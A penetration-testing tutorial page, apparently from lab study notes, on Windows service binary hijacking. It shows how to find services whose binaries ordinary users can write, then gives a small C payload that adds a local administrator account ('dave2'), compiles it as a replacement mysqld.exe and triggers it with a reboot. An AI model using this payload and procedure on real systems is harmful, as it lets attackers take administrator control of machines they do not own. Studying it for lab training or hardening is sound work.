---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Service Binary Hijacking

Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state.

This example will consider a scenario in which a software developer creates a program and installs an application as a Windows service. During the installation, the developer does not secure the permissions of the program, allowing full Read and Write access to all members of the Users group. As a result, a lower-privileged user could replace the program with a malicious one. To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as `LocalSystem`.

This example will involve using a machine `CLIENTWK220` on which the attacker is assumed to have access to a compromised user account `dave` via RDP.

## Service Enumeration

### Get-CimInstance

After connecting to the machine, the attacker can leverage the PowerShell cmdlet [`Get-CimInstance`](../../../windows-services.md#get-ciminstance) to enumerate the running services.

When run on the target machine several interesting items appear:

```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                          State   PathName
----                          -----   --------
Apache2.4                     Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                       Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppReadiness                  Running C:\Windows\System32\svchost.exe -k AppReadiness -p
AppXSvc                       Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder          Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                      Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BetaService                   Running C:\Users\steve\Documents\BetaServ.exe
BFE                           Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                          Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure          Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                         Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
NcbService                    Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Netman                        Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
netprofm                      Running C:\Windows\System32\svchost.exe -k netprofm -p
nsi                           Running C:\Windows\system32\svchost.exe -k LocalService -p
```

The two XAMPP services `Apache2.4` and `mysql` stand out as the binaries are located in the `C:\xampp\` directory instead of `C:\Windows\System32`. This means **the service is user-installed and the software developer is in charge of the directory structure as well as permissions of the software**. These circumstances make it potentially prone to service binary hijacking.

## Service Permission Enumeration

In order to enumerate the permissions of the running services there are 2 options:

1. `icals` Windows Utility
2. `Get-ACL` PowerShell cmdlet

### icals

[icals](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories. It is usable in both PowerShell and Windows Command Line.

#### Permission Masks

The most common permissions masks are listed below. A more complete list can be found in the Windows documentation linked above.

<table><thead><tr><th width="114">Mask</th><th>Name</th></tr></thead><tbody><tr><td><code>F</code></td><td>Full access</td></tr><tr><td><code>M</code></td><td>Modify access</td></tr><tr><td><code>RX</code></td><td>Read and execute access</td></tr><tr><td><code>R</code></td><td>Read-only access</td></tr><tr><td><code>W</code></td><td>Write-only access</td></tr></tbody></table>

icals is called with the following command structure:

```
icals "PATH-TO-BINARY"
```

For example it can be used first on the `Apache2.4` binary and then the `mysql` binary as follows:

```powershell
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

Based on the output, `dave` (as a member of the `Users` group) only has read-execute (`RX`) access to the Apache binary. However it would seem he has full (`F`) access to the MySQL binary.

### Get-Acl

The [Get-Acl](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7.4) cmdlet can be used to view the security descriptor for a resource (such as a service binary).

The cmdlet is used `Get-Acl -Path PATH_TO_BINARY`as demonstrated in the example:

```powershell
PS C:\Users\milena> Get-Acl -Path C:\BackupMonitor\BackupMonitor.exe


    Directory: C:\BackupMonitor


Path              Owner              Access
----              -----              ------
BackupMonitor.exe CLIENTWK221\offsec BUILTIN\Administrators Allow  FullControl...
```

The output can be a bit limited. Fortunately, it can be cleaned up a bit for ease of use.&#x20;

[This article](https://devblogs.microsoft.com/powershell-community/understanding-get-acl-and-ad-drive-output/) provides some techniques for easier understanding of the output. The techniques are primarily focused on AD environments but can be adapted for local uses. For example, the `.Access` property of the ACL can be queried to show a list of access levels by local group:

```powershell
(Get-Acl -Path PATH_TO_EXE).Access
```

The output from this command run on an example machine is shown below:

```powershell
PS C:\Users\milena> (Get-Acl -Path C:\BackupMonitor\BackupMonitor.exe).Access


FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : ReadAndExecute, Synchronize
AccessControlType : Allow
IdentityReference : BUILTIN\Users
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : Modify, Synchronize
AccessControlType : Allow
IdentityReference : NT AUTHORITY\Authenticated Users
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None
```

In this particular case, the user `milena` is a member of the NT AUTHORITY\Authenticated Users group and therefore can modify the file `C:\BackupMonitor\BackupMonitor.exe`:

```powershell
PS C:\Users\milena> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
```

## Replacing the Binary

Now that a vulnerable (`mysql`) binary has been located a new one can be compiled to drop in its place. In most instances, where an attacker wishes to remain undetected, it would be beneficial to replace the binary with one that still provides the MySQL services as well as the intended malicious implant. However, for this example, only the implant portion will be considered.

The binary can be created on the attacker's machine, compiled (into an executable called `mysqld.exe` to match the service's path), and then dropped into place on the victim machine.

The executable will be quite simple, it will just create a user (`dave2:password123!`) and add it to the local `Administrators` group.

{% code title="adduser.c" %}
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
{% endcode %}

The code will then be cross-compiled with the [mingw-64](https://www.mingw-w64.org/) tool. Since the target is known to be 64-bit, the code will be cross-compiled with the `x86_64-w64-mingw32-gcc` command:

```bash
x86_64-w64-mingw32-gcc adduser.c -o mysqld.exe
```

From here it can be transferred to the victim machine. This can be done via an HTTP/S server or, depending on the RDP client in use, via the RDP client. Remmina offers the ability to set a "Share Folder" that is on the local machine but appears as a networked drive on the target.

Once the malicious executable has been moved to `C:\xampp\mysql\bin\mysqld.exe` the running `mysql` service must be restarted to cause the new code to be executed. This can be done via the [net stop](https://ss64.com/nt/net-service.html) command:

```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.

Access is denied.
```

Unfortunately in this case, `dave` is denied the proper access to stop the service. Given this roadblock, perhaps it is possible to restart the service by restarting the whole machine. First the service's&#x20;

[Startup Type](../../../windows-services.md#startup-type) must be checked. As mentioned in the Windows Services section this can be done via the `Get-CimInstance` cmdlet in PowerShell. In this case only the service's `Name` and `StartMode` are needed. Output is limited to just `mysql` via the `Where-Object` cmdlet:

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
{% endcode %}

Running this on the victim machine reveals mysql has an _Automatic_ Startup Type:

```powershell
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```

This means the service is automatically started when the machine boots up. If `dave` can restart the machine that will cause the malicious executable to be run and a new Local Administrator user (`dave2`) to be added to the machine. To check whether shutting down the system is permitted for `dave`, run the `whoami` command with the `/priv` flag:&#x20;

```powershell
PS C:\Users\dave> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The `State` column in the output can be easily misinterpreted. At a glance, it appears the user does not have permission to shutdown the system (`SeShutdownPrivilege`). In fact, The `Disabled` state only indicates if the privilege is currently enabled for the running process. In this case, it means that `whoami` has not requested and is not currently using the `SeShutdownPrivilege` privilege. The privilege's mere presence in the list indicates it is available to the current user.

Therefore, as `dave` a restart command can be issued using the shutdown command with the `/r` flag. In this example, `/t 0` is also used to cause the restart to happen immediately:

```powershell
PS C:\Users\dave> shutdown /r /t 0
```

Once the system comes back online, the attacker can login as dave again and verify the new user was created as a member of the `administrators` group:

```powershell
PS C:\Users\dave> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```

Alternatively, the attacker can login as the newly added user (`dave2:password123!`):

```powershell
PS C:\Users\dave2> whoami
clientwk220\dave2

PS C:\Users\dave2> net user dave2
User name                    dave2
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/14/2023 3:07:53 PM
Password expires             1/25/2024 3:07:53 PM
Password changeable          12/14/2023 3:07:53 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   12/14/2023 3:10:28 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
The command completed successfully.
```

The attacker has successfully elevated themselves from normal user privileges (provided via the account `dave`) to a Local Administrator (`dave2` account).

## Checking Automatically

Within the [PowerUp](../../enumeration/automated-enumeration.md#powerup) PowerShell module there is a `Get-ModifiableServiceFile` cmdlet that will check for modifiable service binaries:

```powershell
PS C:\Users\dave> . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableServiceFile

ServiceName                     : edgeupdate
Path                            : "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'edgeupdate'
CanRestart                      : False
Name                            : edgeupdate

...
ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
Name                            : mysql
```

The automated check does indeed return the binary used in the example. While `PowerUp.ps1` does provide an `Install-ServiceBinary` cmdlet, it actually returns an error when called with the mysql service:

```powershell
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'

Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```

A bit of digging reveals that this has to do with the `Get-ModifiablePath` function returning an empty set and causing the error. In this instance the information found in the scan should just be used with a manual exploitation technique illustrated above.&#x20;
